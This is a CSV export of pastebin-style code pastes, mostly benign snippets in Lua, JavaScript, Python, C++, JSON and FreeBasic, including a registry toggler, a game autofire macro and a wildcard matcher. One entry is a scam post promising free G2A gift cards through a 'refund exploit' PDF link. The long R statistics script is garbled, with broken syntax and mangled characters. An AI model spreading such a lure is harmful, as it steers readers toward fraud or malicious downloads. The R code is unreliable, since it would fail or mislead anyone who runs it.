id,title,username,language,date,content
1gpe91xx,Generated Thing,MODFINDER_STOCK_MODS,Lua,Wednesday 24th of April 2024 12:51:22 AM CDT,"while wait(1) do
    script.Parent.Text = ""1.0.0.0""
end"
Jx94ZLGU,fieldsOfView,Savelyev_Vyacheslav,JavaScript,Wednesday 24th of April 2024 12:26:45 AM CDT,"
const fields = fieldsOfView('itsm_change_request', '171389475835325430')

print_r(fields)

function fieldsOfView(tableName, formId) {
    let tableID = (new SimpleRecord('sys_db_table')).get('name', tableName).sys_id;
    let field = new SimpleRecord('sys_ui_form_element')
    field.addQuery('form_section_id.form_id.table_id', tableID)
    field.addQuery('form_section_id.form_id', formId)
    field.addQuery('column_id', 'ISNOTEMPTY')
    field.orderBy('position');
    field.query();
    let fieldLocation = {};
    let section = [];
    let fieldName = [];
    let sectionAndFieldNemes = [];
    while (field.next()) {
        fieldLocation[field.column_id.column_name] = getDisplayName(field.column_id)
    }
    return fieldLocation
}

function getDisplayName(ID) {
      let field = new SimpleRecord('sys_translation')
      field.addQuery('record_id', ID)
      field.addQuery('language_id', ss.getUser().language_id)
      field.query();
      field.next()
      return field.value
}"
styz9Aa3,tlco.lua,opencomputerstest2,Lua,Wednesday 24th of April 2024 12:23:47 AM CDT,"local run = os.run

local args = {...} -- keep the args so that they can be passed to opus.lua

os.shutdown = function()
	_ENV.multishell = nil -- prevent sys/apps/shell.lua erroring for odd reasons

	local success, err = pcall(function()
		run(_ENV, '/rom/programs/shell.lua', table.unpack(args))
	end)
	term.redirect(term.native())
	if not sucess then
		printError(err)
	end
	print(""Press any key to continue."")
	os.pullEvent(""key"")
	os.reboot()
end
os.pullEvent()"
k49PvAr5,Practicality of life,sanket2383,R,Wednesday 24th of April 2024 12:11:50 AM CDT,"## Set A

## 1) Model Sampling from Cauchy and Laplace distribution
> # a)
> # X follows cauchy disribution with parameter theta=10 and lambda=1
> #using inverse Transformation CDF
> n=11 #size of random sample to be drawn from Cauchy distribution
> lambda=1 #Scale Parameter
> theta=10 #Location parameter
> # As we Know that evry distribution cdf follows standard uniform distribution
> y=runif(n) # Generating random sample of size 11 from uniform distribution
> x=lambda*tan(pi* (v-0.5))+theta;x
> # b) Median of the cauchy sample obtain From obove
> median(x)
## Cauchy= L/2*exp(-L|x-u|)



## 2) Log normal Cancer
# (1/(x-a)sigrt2pi)exp(-1/2sigsq(logx-a - u)sq)
> # Fiting log normal distribution
> LL=seq(0,60,10);LL #lower Limit of given data
> UL=seq(10,70,10);UL #upper limit of the given data
> Freq=c(20,90,52,11,6,4,1);Freq
> N=sum(Freq)
> x=(UL+LL)/2; #mid point of the gien data
> d=data.frame(""lower limit""=LL, ""Upper limit""=UL,""mid point""=x, ""frequency""=Freq)
> d
> M12=sum(Freq*x/sum(Freq); M12 # Frist sample raw Movement used for estimating mean and Sigma
> M13=sum(Freq*(x^2))/sum(Freq);M13 # Second sample raw moment used for estimating mean sigma
> sigma_est=log(M13,base=exp(1))-(2*log(M12,base =exp (1))); sigma_est ##estimating sigma for calculating Probabilities
> mu_est=(2*log(M12,base=exp(1)))-(log(M13,base=exp(1))/2); mu_est ##estimating mean for calculating probabilities
> a=plnorm(UL,mu_est,sqrt(sigma_est));a #calculating cumulative Probabilities
> px=с()
> px[1]=a[1]
> for (i in 1: (length(a)-1)){
+ px[i+1]=ali+1]-a[i]
+}
> ExFreq=round(N*px,2);ExFreq
> sum(ExFreq)
> D1= data.frame(d, ""expected""= Exfreq)




# 3) literates 2 year Ratio and Regression mthd
› #Ratio and regression method of estimation Comparsion with SRSWOR
> x=с(109,101,125,254,559,359,427,481);X
> y=c(99,112,111,278,634,355,399,489); Y 
> N=170
#No observation of given data X.
> n=length(y)
> Xt=21288000 #population total of given data X
> Х_bar_N=xt/N;X_bar_N #Population Mean of given data of X
> y_bar_n=mean(y)
> x_bar_n=mean(x)
> #Ratio method. 
> Rn=y_bar_n/x_bar_n;Rn #ratio of sample mean of y and x
> Y_bar_N=Rn*X_bar_N;Y_bar_N #Estimate of Population mean of Y
> sy_sq=var(y);sy_sq #sample mean square of y
> sx_sq=var(x);sx_sq #sample mean square of x
> sxy_sq=var(x,y);sxy_sq #sample mean square of xy
> SE_Y_totalhat=N*sqrt(((1/n)-(1/N))*(sy_sq+Rn^2*sx_sq-(2*Rn*sxy_sq)));SE_Y_totalhat #Estimate of SE of population total of Y
> #Regression method:
> byx=sxy_sq/sx_sq;byx #regression coefficient of Y on X
> Y_hat=y_bar_n+(byx*(X_bar_N-x_bar_n));Y_hat #Estimate of Population mean of Y
> Y_hat_total=N*Y_hat;Y_hat_total #Estimate of Population total of Y
> SE_Y_total1=N*sqrt((N-n)/(N*n))*(sy_sq+(byx^2*sx_sq)-(2*byx*sxy_sq)));SE_Y_total1 #Estimate of SE of population total of Y
> #comparison between SRSwor
> var_y_bar=((1/n)-(1/N))*sy_sq;var_y_bar #variance of sample mean under SRSWOR
› SE_Y_hat=N*sqrt(var_y_bar);SE_Y_hat #S.E of sample mean under SRSWOR
> #conclusion- SE(Y_hat)SRSWOR>SE(Y_hat)RATIO>SE(Y_hat)REGRESSION
># This implies that variation of regression estimator is minimum and use supplementary information increases the precision.




## SET B
## 1. B
> #que no 4
> mu=5
> sigma=sqrt(4)
> set.seed (8)
> u=runif(8,0,1)
#where u and v follows U(0,1)
> U
> v=runif (8,0,1)
> V
> z=sqrt(-2*log(x=u)) *cos(2*pi*v)
#random sample from N (0,1)
> Z
1>x=mu+(2* sigma)
#random sample from N(5,4)
> X
> mean (X)
> #conclusion-Hence our sample mean is close to population mean but sample variance shows some deviation but as the sample size tends to infinity it will close to population variance


#1.C
> #Weibull distribution with alpha=15 and beta=10
> alpha3=3
#parameter values of weibull distribution
> beta3=1
> x=seq (-0.01,15,0.1);x
> px4=dweibull(x,shape=beta3,scale=alpha3);px
> plot(x,px4,col=""pink"",xlab=""variable"", ylab=""probability"", lwd=4,type=""1"", ylim=c(0,0.92))

> #а)
> alpha=1
> beta=2 #parameter values of weibull distribution
> x=seq(-0.01,15,0.1);x
> px=dweibull(x,shape=beta,scale=alpha);px
> lines(x=x,y=px,lty=3,col=""yellow"", lwd=3)
>#D）
> alpha1=5 #parameter values of weibull distribution
> beta1=1
> px1=dweibull(x,shape=beta1,scale=alpha1);px
> lines(x=x,Y=px1,col=""blue"", lwd=4,Ity=2)
> #C)
> alpha1=1 #parameter values of weibull distribution
> beta1=1
> px2=dweibull(x,shape=beta1,scale=alphal);px
> lines(x=x,y=px2,col=""green"", lwd=3,Ity=2)
> 
>#d)
> alpha2=10 #parameter values of weibull distribution
> beta2=5
> px3=dweibull(x,shape=beta2,scale=alpha2); px
> lines(x=x,y=px3,col=""violet"", wd=4,Ity=2)
legend (locator(1), legend=c(""W(alpha=3,beta=1)"", ""W(alpha=1,beta=2)"", ""W(alpha=5,beta=1)"", ""W(alpha=1,beta=1)"", ""W(alpha=10, beta=5)"") fill=c(""pink"", ""yellow"",""blue"", ""green"", ""violet""))
> #conclusion-As we we increase the values of both the shape parameter it slowly becomes symmetric from strong negatively skewed.




###proportional and neyman allocation
> N1=80 #population
> N2=60
> N3=40
> N4=100
> N5=100
> Ni=c(80,60,40,100,120); Ni #population of each strata
> N=sum(N1,N2,N3, N4, N5);N
> y_bar_i=c(82.3,161.5,139.2,239.1,200);Y_bar_i #Popn mean of each strata
> Si=c(21.3,17.7,14.7,15.3,18.9);Si
> n=40
> # Obtain the size of the sub sample from each stratum
> # for population allocation
> ni=(n/N)*Ni;ni
> n1=ni[1];n1
> n2=ni|2];n2
> n3=ni[3];n3
> n4=ni[4];n4
> n5=ni[5];n5

># for Nayman's allocation
> ni=(n*Ni*Si)/sum(Ni*Si)
> n1=round(ni(1],0);n1
> n2=round(ni[2],0);n2
> n3=round(ni[3],0);n3
> n4=round(ni[4],0);n4
> n5=round (ni[5],0);n5
> # To obtain S.E of the estimate of population mean and population total
> # under population allocation
> pi=c(N1/N,N2/N,N3/N, N4/N,N5/N);pi
> S_E_est_ Ybar1=sqrt(((1/n)-(1/N))*sum(pi*Si^2));S_E_est_Ybar1
> S.E_est_Yt1=sqrt(N*S_E_est_Ybar1);S.E_est_Yt1
› # Under Nayman's allocation
> S.E_est_ Ybar2=sqrt((1/n)*(sum(pi*Si))*2)-((1/N)*sum(pi*Si^2)));S.E_est_Ybar2
> S.E_est_Vt2=sqrt(N*S.E_est_Ybar2);S.E_est_Yt2
> #UNDER SRSWOR
> Y_bar_N=sum(Y_bar_i*Ni)/N;Y_bar_N
> S.E_est_Ybar3=sart((N-n)/(N*n))*(1/(N-1)) *(Isum(Ni-1) *Si^2)+(sum((Y_bar_i-Y_bar _N)*2*Ni));S.E_est_Ybar3
> S.E_est_Yt3=sqrt(N*S.E_est_Ybar3);S.E_est_Yt3
› # conclusion:since varience of ybarst of population mean under SRSWOR is more than the varience under population allocation and Neyman's allocation



SET C 
Q1. A(i)
> x=sort(c(24,38,61,22,16,57,31,29,35));x
> length(x)
> LL=seq(1,9,1);LL
> UL=sort(seq(1,9,1), decreasing = TRUE); UL
> d=data.frame(LL,UL);a
> d1=subset(d,LL<UL); d1
> d2=data.frame(d1,LB=x[d1$LL],UB=[d1$UL]);d2
> con_Fin=pbinom(d2$UL-1,9,0.5)-pbinom(d2$LL-1,9,0.5)
> data.frame(d2,con_Fin)
> #Median would lie within 24,38 confidence interval with 82% confidence coefficent.

Q1. C
> #Q 2: 6 students mark out of 50
> L=c(42,18,25,35,20,30);L
> N=length(L);N #L is total no of sampling unit IN population
> n=2;n
> 0b1=1:6
> 002=1:6
> m=merge(ob1,0b2);m
> sub=subset(m,m$x>m$y);sub #position of observation in SRSWOR sample
> d=data.frame(ob1=L|sub|,11],ob2=L[sub|,2]]);d
> d1=data.frame(d,m=apply(d,1,mean),sv=(apply(d,1,var))*((n-1)/n));d1
> n1= length(d1$sm)
> #verify(E(y_bar)=Y_bar)
> est_y_bar=mean(d15sm);est_y_bar
> #conclusion:population mean is unbiased estimator of sample mean
> ybar=mean(L); ybar
> #veryfy (var(ybar)=((N-n)/Nn)s^2)
> n=length(d1$sv);n
> var_y_bar-var(d15sm)*(n1-1)/(n1);var_y_bar
> RHS=var(L)*((N-n)/(N*n)); RHS

> #confidence interval for population mean
> alpha=0.05
> z_alpha_2=gnorm(1-(alpha/2));z_alpha_2
> sigma=sqrt(d1$sv);sigma
> d2-data.frame(d2, L_cl-d15m-(z_alpha_2*sigma), U_CL=15sm+(z_alpha 2*sigma));d2
> d3=data.frame(d2,T_L_cl=N*(d1$sm-(z_alpha_2*sigma)), T_U_CL=N*(d1$sm+(z_alpha_2*sigma)));d3

## list of 3100 , 41 wrong .. Find SE and CI
> N=3100;N # where N is Population size.
> n=200;n #where n is random sample size from population.
> a=41 #No. of names and address which are wrong and need to be corrected in list in sample of 200.
> р=а/п;р #where p is proportion of sample which is unbaised estimator of population proportiona
> q=1-p;9

> #To find estimate for standard error for population Proportion
> est_S.E_est_P=sqrt((N-n)/(n*N))*(n/(n-1))*p*q);est_S.E_est_P
> #To find 95% confidence interval for population proprotion
> #for n>30
> alpha=0.05
> Z_alpha=qnorm (1-(alpha/2),0,1);Z_alpha
> L_CI=p-(Z_alpha*est_S.E_est_P);L_CI
> U_CI=p+(Z_alpha*est _S.E_est_P);U_Cl

> #To find 95% confidence interval for population Total
> L_CI=N*(p-(Z_alpha*est_S.E_est_P));L_Cl
> U_CI=N*(p+(Z_alpha*est_S.E_est_P));U_Cl



Sale_last_year=c(50,35,12,10, 15,30,9,25, 100,250,50,50,150,100,40);Sal e_last_year
111 50 35 12 10 15 30 9 25 100 250 50 50 150 100 40
> Sale_this_year=c(56,48,22,14,18,26,11,30,165,409,73,70,95,55,83);Sale _this_year
> N=300
#No observation of given data X
> n=length(y)
> Xt=21300
#population total of given data X
> X_bar_N=Xt/N;_bar_N
[1] 71
#Population Mean of given data of x
> y_bar
_n=mean (y)
> x_
bar_n=mean(x)
#sample mean of y #sample mean of y
> #Ratio method.
> Rn=y_bar_n/x_bar_n;Rn
#ratio of sample mean of y and
sample meanof x
[1] 0.9622642
> Y_bar_N=Rn *X_bar_N;Y_bar_N
#Estimate of Population mean of
Y
[1] 68.32075
> sy_sq=var(y);sy_sq
#sample mean square of y
[1] 88.1
> sx_sq=var(x);sx_sq
#sample mean square of x
[1] 100.6778
> sxy_sq=var(x,y);sxy_sq
#sample mean square of xy
[1] 79.63333
_Y_totalhat=N*sqrt(((1/n)-(1/N))*(sy_sq+Rn^2*sx_sq-
(2*Rn*sxy_sq)));SE_Y.
_totalhat #Estimate of SE of population total of Y
[1] 494.1418
> #Regression method:
> byx=sxy_sq/sx_sq;byx
#regression coefficient of Y on X
[1] 0.7909723
> Y_hat=y_bar_n+(byx*(X_bar_N-x_bar_n));Y__hat
Population mean of Y
[1] 66.14535
> Y_hat_total=N*Y_hat;Y_hat_total
mean of X
[1] 19843.6
#Estimate of Population
> SE_Ytotal1=N*sqrt((N-n)/(N*n))*(sy_sa+(byx^2*sx_sa)-(2*byx*sxy_sq)))
> #The Standard error of estimator from Ratio and regression method is494.1418 and 467.4147"
pjTD5bMp,advanced_mega_registry_toggle,Python253,Python,Wednesday 24th of April 2024 12:07:54 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: advanced_mega_registry_toggle.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
This script manages Windows registry settings related to system configurations.
It provides functions to retrieve the current value of specific registry entries and set them to a new value.
If the registry does not exist, it will be created and set to 'Disabled'.

Functions:
1. get_registry_value(value_name):
   - Retrieves the current value of a specified registry entry.

2. set_registry_value(value_name, value_data):
   - Sets a registry entry to a specified value.

3. main():
   - Orchestrates the execution flow, displaying current registry values, accepting user input to toggle them, and updating the registry accordingly.

Requirements:
- Python3.x
- Windows 10+

Usage:
1. Ensure Python3 is installed on your Windows system.
2. Run the script from the command line or terminal.
3. Follow the on-screen instructions to view and toggle registry values.

Additional Notes:
- Exercise caution when modifying registry values to avoid system instability or data loss.
- Always back up important data and registry settings before making any modifications.
- Use this script responsibly and at your own risk.
- The author and contributors are not liable for any damage caused by its usage.
""""""

import subprocess


def get_registry_value(value_name):
    """"""
    Get the current value of a registry value.

    Args:
        value_name (str): Name of the registry value.

    Returns:
        int: Current data value of the registry value.
    """"""
    result = subprocess.run(
        [
            ""reg"",
            ""query"",
            ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
            ""/v"",
            value_name,
        ],
        capture_output=True,
        text=True,
    )
    if ""REG_DWORD"" in result.stdout:
        lines = result.stdout.strip().split(""\n"")
        for line in lines:
            if ""REG_DWORD"" in line:
                parts = line.split()
                return int(parts[-1], 16)  # Convert hexadecimal to decimal
    return None


def create_registry_entry(value_name, value_data):
    """"""
    Create a new registry entry with the specified value.

    Args:
        value_name (str): Name of the registry value.
        value_data (int): Data for the new registry value.

    Returns:
        None
    """"""
    subprocess.run(
        [
            ""reg"",
            ""add"",
            ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
            ""/v"",
            value_name,
            ""/t"",
            ""REG_DWORD"",
            ""/d"",
            str(value_data),
            ""/f"",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


# Dictionary mapping registry value names to their default data values
DEFAULT_VALUES = {
    ""AutoCheckSelect"": get_registry_value(""AutoCheckSelect""),
    ""DisablePreviewDesktop"": get_registry_value(""DisablePreviewDesktop""),
    ""DontPrettyPath"": get_registry_value(""DontPrettyPath""),
    ""EnableSnapAssistFlyout"": get_registry_value(""EnableSnapAssistFlyout""),
    ""Filter"": get_registry_value(""Filter""),
    ""HideFileExt"": get_registry_value(""HideFileExt""),
    ""HideIcons"": get_registry_value(""HideIcons""),
    ""Hidden"": get_registry_value(""Hidden""),
    ""IconsOnly"": get_registry_value(""IconsOnly""),
    ""ListviewAlphaSelect"": get_registry_value(""ListviewAlphaSelect""),
    ""ListviewShadow"": get_registry_value(""ListviewShadow""),
    ""MapNetDrvBtn"": get_registry_value(""MapNetDrvBtn""),
    ""MMTaskbarGlomLevel"": get_registry_value(""MMTaskbarGlomLevel""),
    ""NavPaneShowAllFolders"": get_registry_value(""NavPaneShowAllFolders""),
    ""PerformedOneTimeHideOfShowDesktopButtonForCopilot"": get_registry_value(
        ""PerformedOneTimeHideOfShowDesktopButtonForCopilot""
    ),
    ""ReindexedProfile"": get_registry_value(""ReindexedProfile""),
    ""SeparateProcess"": get_registry_value(""SeparateProcess""),
    ""ServerAdminUI"": get_registry_value(""ServerAdminUI""),
    ""ShowCortanaButton"": get_registry_value(""ShowCortanaButton""),
    ""ShowCompColor"": get_registry_value(""ShowCompColor""),
    ""ShowCopilotButton"": get_registry_value(""ShowCopilotButton""),
    ""ShowInfoTip"": get_registry_value(""ShowInfoTip""),
    ""ShowSecondsInSystemClock"": get_registry_value(""ShowSecondsInSystemClock""),
    ""ShowStatusBar"": get_registry_value(""ShowStatusBar""),
    ""ShowSuperHidden"": get_registry_value(""ShowSuperHidden""),
    ""ShowTypeOverlay"": get_registry_value(""ShowTypeOverlay""),
    ""StartMenuInit"": get_registry_value(""StartMenuInit""),
    ""StartMigratedBrowserPin"": get_registry_value(""StartMigratedBrowserPin""),
    ""StartShownOnUpgrade"": get_registry_value(""StartShownOnUpgrade""),
    ""Start_TrackProgs"": get_registry_value(""Start_TrackProgs""),
    ""TaskbarAl"": get_registry_value(""TaskbarAl""),
    ""TaskbarAnimations"": get_registry_value(""TaskbarAnimations""),
    ""TaskbarBadges"": get_registry_value(""TaskbarBadges""),
    ""TaskbarDa"": get_registry_value(""TaskbarDa""),
    ""TaskbarFlashing"": get_registry_value(""TaskbarFlashing""),
    ""TaskbarGlomLevel"": get_registry_value(""TaskbarGlomLevel""),
    ""TaskbarMigratedBrowserPin"": get_registry_value(""TaskbarMigratedBrowserPin""),
    ""TaskbarMn"": get_registry_value(""TaskbarMn""),
    ""TaskbarSd"": get_registry_value(""TaskbarSd""),
    ""TaskbarSi"": get_registry_value(""TaskbarSi""),
    ""TaskbarSizeMove"": get_registry_value(""TaskbarSizeMove""),
    ""TaskbarSmallIcons"": get_registry_value(""TaskbarSmallIcons""),
    ""TaskbarAutoHideInTabletMode"": get_registry_value(""TaskbarAutoHideInTabletMode""),
    ""WebView"": get_registry_value(""WebView""),
    ""WinXMigrationLevel"": get_registry_value(""WinXMigrationLevel""),
}


def set_registry_value(value_name, value_data):
    """"""
    Set a registry value.

    Args:
        value_name (str): Name of the registry value.
        value_data (int): Data to set for the registry value.

    Returns:
        None
    """"""
    subprocess.run(
        [
            ""reg"",
            ""add"",
            ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
            ""/v"",
            value_name,
            ""/t"",
            ""REG_DWORD"",
            ""/d"",
            str(value_data),
            ""/f"",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def main():
    sorted_values = sorted(DEFAULT_VALUES.items(), key=lambda x: x[0])
    max_name_length = max(len(name) for name, _ in sorted_values)

    print(""\n\n\t\t::ADVANCED MEGA REGISTRY TOGGLE::\n\n"")
    for idx, (name, default_value) in enumerate(sorted_values, start=1):
        idx_str = f""{idx:02d}""  # Preface single-digit option numbers with a 0
        current_value = get_registry_value(name)
        if current_value is not None:
            state = ""Enabled"" if current_value else ""Disabled""
            print(f""{idx_str}: {name.ljust(max_name_length)}: {state}"")
        else:
            print(f""{idx_str}: {name.ljust(max_name_length)}: Not found"")

    print(""\nEnter the number of the option to toggle (or type '0' to quit):"")
    while True:
        choice = input(""> "")
        if choice == ""0"":
            print(""\n\tExiting Program...\tGoodBye!"")
            break
        try:
            choice = int(choice)
            if choice < 1 or choice > len(DEFAULT_VALUES):
                print(
                    ""\nInvalid option. Please enter a number between 1 and"",
                    len(DEFAULT_VALUES),
                )
                continue
        except ValueError:
            print(""\nInvalid input. Please enter a number or '0' to quit.\n"")
            continue

        # Toggle the selected option
        value_name = sorted_values[choice - 1][0]
        current_value = get_registry_value(value_name)
        if current_value is not None:
            new_value = 1 if current_value == 0 else 0
            set_registry_value(value_name, new_value)
            print(f""{value_name}: {'Enabled' if new_value else 'Disabled'}\n"")
        else:
            # If registry entry doesn't exist, create it with default value 0
            create_registry_entry(value_name, 0)
            print(f""{value_name}: Created and set to 'Disabled'\n"")


if __name__ == ""__main__"":
    main()
"
3kXcgVtX,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Wednesday 24th of April 2024 12:05:01 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_675437.pdf

Working as of:
24 April 2024"
vmcD7yPV,Untitled,calebsan,C++,Tuesday 23rd of April 2024 11:21:41 PM CDT,"String payload = ""{\""peewee_count\"":5,\""pullet_count\"":10,\""small_count\"":8,\""medium_count\"":15,\""large_count\"":20,\""extra_large_count\"":12,\""jumbo_count\"":3,\""crack_count\"":0\""}"";

  // Start the POST request
  HTTPClient http;
  http.begin(""http://localhost:8000/api/add"");
  http.addHeader(""Content-Type"", ""application/json"");

  // Send the POST request
  int httpResponseCode = http.POST(payload);"
SvJ8080i,Elite:Dangerous: Titan-Bomber Script,FocusedWolf,Python,Tuesday 23rd of April 2024 11:15:21 PM CDT,"#!/usr/bin/env python3

##### What it do #####
# 1. This script repeatedly taps Caps Lock while Caps Lock is held down.
#    Caps Lock is my boost key in Elite:Dangerous. This can be changed on line 60.
#
# 2. If Scroll Lock is on, then this script repeatedly taps the Right Mouse Button (RMB) while you are holding RMB down.
#    If Scroll Lock is off, then RMB behaves normally.
#
#    For reference here are my titan-bomber fire groups indicating what RMB is assigned to:
#                              A       B       C       D       E
#    Beam Laser -------------------------------1-------1---------------
#    AX Missile Rack ----------------------------------2---------------
#    AX Missile Rack ----------------------------------2---------------
#    AX Missile Rack ----------------------------------2---------------
#    Nanite Torpedo Pylon ---------------------2-----------------------
#    Repair Limpet --------------------------------------------1-------
#    TG Pulse Neutraliser -------------2-------------------------------
#    Enhanced Xeno Scanner ----2---------------------------------------
#    Heatsink ---------------------------------------------------------
#    Caustic Sink Launcher ------------1-------------------------------
#    Data Link Scanner --------2---------------------------------------
#    Comp. Scanner ------------2---------------------------------------
#    D-Scanner ----------------1---------------------------------------

##### How to use this script when titan bombing #####
# 1. When you jump into a titan system make sure your Scroll Lock is toggled off (LED off).
#    This disables the RMB autofire since we don't need that ability yet.
#
# 2. When interdicted keep your boost key held down with all pips to engines. No need to spam the boost key like you're having a seizure every time you get interdicted.
#    For maximum effect this video should be playing in the background: https://www.youtube.com/shorts/LmCPl-3Szzw
#
# 3. When you are through the malestrom, turn on Scroll Lock to enable RMB autofire.
#    Now commence to torpedo the thermal vents and appreciate not having to rightclick like a madman while waiting for the torpedo to actually fire after acquiring a lock.
#
# 4. Now fly to the exposed core and appreciate once again not having to spam rightclick to fire as many rockets as possible while the core is vulnerable.

##### Installation #####
# 1. Install the latest python, i.e. https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe
#
# 2. Install pynput: Run cmd as administrator > pip install pynput
#
# 3. Save this script as a .py file, e.g. ""Titan Script.py"".
#    Modify as required.
#
# 4. Double click the file to run the script.
#
# 5. Enjoy.

# Windows: $ pip install pynput
# SOURCE: https://pypi.org/project/pynput/
import pynput
from pynput.keyboard import Key, KeyCode, Controller as KeyboardController
from pynput.mouse import Button, Controller as MouseController

# You will need to modify this list based on your keybinds.
# Any key or mouse button added here will autofire while physically held.
hotkeys = [
    Button.right, # Right mouse button. My Nanite Torpedo Pylone & AX Missile Rack button.

    Key.caps_lock, # This is my boost key [Flight Miscellaneous > Engine boost].
    # Key.tab, # If you use Tab then uncomment this one instead.
    # KeyCode.from_char('b'), # If you use a letter key like 'B' then uncomment this one instead.
]

##### Keyboard Hook #####

pressed_inputs = { }

def on_press(key):
    if key in hotkeys:
        pressed_inputs[key] = True

def on_release(key):
    if key in hotkeys:
        pressed_inputs[key] = False

LLKHF_INJECTED = 0x10
def keyboard_win32_event_filter(msg, data):
    # Suppress simulated key presses from triggering pynput listener callbacks.
    return not data.flags & LLKHF_INJECTED

keyboard_listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release, win32_event_filter=keyboard_win32_event_filter)
keyboard_listener.start()

##### Mouse Hook #####

def on_click(x, y, button, pressed):
    if button in hotkeys:
        pressed_inputs[button] = pressed

LLMHF_INJECTED = 0x01
def mouse_win32_event_filter(msg, data):
    # Suppress simulated mouse presses from triggering pynput listener callbacks.
    return not data.flags & LLMHF_INJECTED

mouse_listener = pynput.mouse.Listener(on_click=on_click, win32_event_filter=mouse_win32_event_filter)
mouse_listener.start()

##### MNK Simulation #####

import time
def sleep(milliseconds):
    time.sleep(milliseconds / 1000)

keyboard_controller = KeyboardController()
mouse_controller = MouseController()

def simulate_press(mnkInput, inputDelay = 50):
    if not isinstance(mnkInput, (Key, KeyCode, Button)):
        print(f'Invalid Input: Expected pynput.keyboard.Key, pynput.keyboard.KeyCode, or pynput.mouse.Button. Received: {type(mnkInput)}.')
        return
    print('Simulate', mnkInput)
    controller = keyboard_controller if isinstance(mnkInput, (Key, KeyCode)) else mouse_controller
    controller.press(mnkInput)
    sleep(inputDelay)
    controller.release(mnkInput)
    sleep(inputDelay)

##### Toggle key status #####

import ctypes
def is_capslock_on():
    return ctypes.windll.user32.GetKeyState(0x14)

def is_numlock_on():
    return ctypes.windll.user32.GetKeyState(0x90)

def is_scrolllock_on():
    return ctypes.windll.user32.GetKeyState(0x91)

##### Main #####

def main():
    while True:
        for key,pressed in pressed_inputs.items():
            if pressed:
                if key == Button.right and not is_scrolllock_on():
                    # Skip RMB autofire when Scroll Lock is not on.
                    pass
                else:
                    # Repeat pressed keys.
                    simulate_press(key)
            else:
                # If capslock is released but still toggled (LED is on).
                if key == Key.caps_lock and is_capslock_on():
                    # Simulate a Caps Lock key press to untoggle Caps Lock (turn off LED).
                    simulate_press(Key.caps_lock)
        sleep(1)

if __name__ == '__main__':
    main()"
JLWtGvPL,Kick Up Simulator Codes,venowinters,JSON,Tuesday 23rd of April 2024 09:36:46 PM CDT,"{
    ""Strength"": {""RewardType"": ""Strength"", ""Reward"": 10000000, ""Active"": true,""LikesRequired"": 0}
}
    "
5SGub2BB,Untitled,Mysoft,FreeBasic,Tuesday 23rd of April 2024 08:27:59 PM CDT,"#include ""crt.bi""

function WildMatch( sWildText as string , sCompare as string , iCaseSensitive as boolean = false ) as boolean
  dim as integer iTxt, iCmp
  
  'if any of them is empty... then result is direct
  if sCompare[0] = 0 then return false  
  do
    var iCT = sWildText[iTxt] : iTxt += 1
    var iCC = sCompare[iCmp] : iCmp += 1 
    'print iTxt-1;"" "";chr(iCT),iCmp-1;"" "";chr(iCC)
    select case iCT
    case 0        : return iCC=0 'once it text reachs end.. it's a success
    case asc(""?"") : 'if it's a single char wild
      'we're done if reached end of comparsion
      'and it will be true if next wildtext is also done
      if iCC=0 then return sWildText[iTxt]=0        
    case asc(""*"")       
      var iCT2 = sWildText[iTxt]
      'if matching anything after then it will be true if it's the end of wildtext
      if iCT2 = 0 then return true
      'if is not another wildcard then must continue checking
      if iCT2 <> asc(""?"") andalso iCT2 <> asc(""*"") then         
        'if end of compare text happened then it's false!
        if iCC = 0 then return false
        'if found matching char then continue matching
        if iCaseSensitive then
          if iCC=iCT2 then iTxt += 1: continue do
        else
          if ToLower(iCC)=ToLower(iCT2) then iTxt += 1: continue do
        end if
        'otherwise goes back on wildtext (to compare against *) again
        iTxt -= 1 : continue do
      end if
      'next is also a wildcard, so we will process that
    case else 'is a direct comparsion... 
      'if compare string finished or didnt match then we failed
      if iCC=0 then return false
      if iCaseSensitive then
        if iCC<>iCT then return false
      else
        if ToLower(iCC)<>ToLower(iCT) then return false
      end if
    end select
  loop
end function


print ""Expected"",""Result""
print string(24,""-"")
print true,  WildMatch(""Hello"",""Hello"")
print false, WildMatch(""Hell"",""Hello"")
print false, WildMatch(""Hello"",""Hell"")
print false, WildMatch(""Hello"",""HELLO"",true)
print false, WildMatch(""Hello"",""World"")
print true,  WildMatch(""B?n"",""Bin"")
print true,  WildMatch(""b?n"",""Ben"")
print false, WildMatch(""B?n"",""Bem"")
print true,  WildMatch(""*us"",""jealous"")
print false, WildMatch(""*us"",""jealously"")
print true,  WildMatch(""Bang*"",""Bangaloo"")
print false, WildMatch(""Leap*"",""lip"")
print false, WildMatch(""Bi*us"",""Binocculus"") 'want this to be true?
print true,  WildMatch(""Bi*us"",""Binocc?lus"")
print true,  wildMatch(""*cup*"",""Porcupine"")
print true,  WildMatch(""*Hi*Ta*"",""Hippopotamus"")


sleep"
